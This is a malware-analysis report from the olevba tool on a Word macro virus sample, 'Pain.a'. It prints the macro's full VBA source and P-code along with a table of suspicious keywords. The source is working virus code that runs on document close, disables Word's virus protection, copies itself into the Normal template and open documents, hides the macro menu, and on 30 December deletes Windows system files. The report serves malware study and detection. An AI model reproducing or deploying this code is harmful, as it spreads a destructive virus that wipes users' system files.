olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pain.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Pain.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
On Error Resume Next
S = ActiveDocument.Saved
DisableAutoMacro = False
Text = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Countoflines)
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Left(Date, 5) = "30.12" Then Kill ("C:\Windows\System\*.*"): Kill ("C:\Windows\*.*")
Set Mac = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then
Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
For Each Control In CommandBars("Menu Bar").Controls(6).Controls
If Control.Type = 10 Then
For I = 1 To Control.Controls.Count
If Right(Control.Controls(I).Caption, 5) = "Basic" Then Control.Delete
Next I
End If
Next Control
End If
Set Mac = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
With Dialogs(wdDialogFileSummaryInfo): .Keywords = "Word97-2k.Macro.PAIN": .Execute: End With
If ActiveDocument.Path <> "" Then ActiveDocument.Save
ActiveDocument.Saved = S
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Pain.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2828 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub AutoClose())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St S 
' Line #4:
' 	LitVarSpecial (False)
' 	St DisableAutoMacro 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd Countoflines 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Then 
' Line #6:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #8:
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "30.12"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000E "C:\Windows\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Mac 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld Mac 
' 	MemLd Countoflines 
' 	Ld Mac 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Then 
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld Mac 
' 	MemLd Countoflines 
' 	Ld Mac 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Then 
' 	Ld Mac 
' 	ArgsMemCall AddfromString 0x0001 
' Line #12:
' 	StartForVariable 
' 	Ld Control 
' 	EndForVariable 
' 	LitDI2 0x0006 
' 	LitStr 0x0008 "Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #13:
' 	Ld Control 
' 	MemLd TypeOf 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Control 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld I 
' 	Ld Control 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitDI2 0x0005 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0005 "Basic"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Control 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld Control 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Mac 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Mac 
' 	MemLd Countoflines 
' 	Ld Mac 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Then 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld Mac 
' 	MemLd Countoflines 
' 	Ld Mac 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Then 
' 	Ld Mac 
' 	ArgsMemCall AddfromString 0x0001 
' 	EndIf 
' Line #22:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Word97-2k.Macro.PAIN"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #24:
' 	Ld S 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

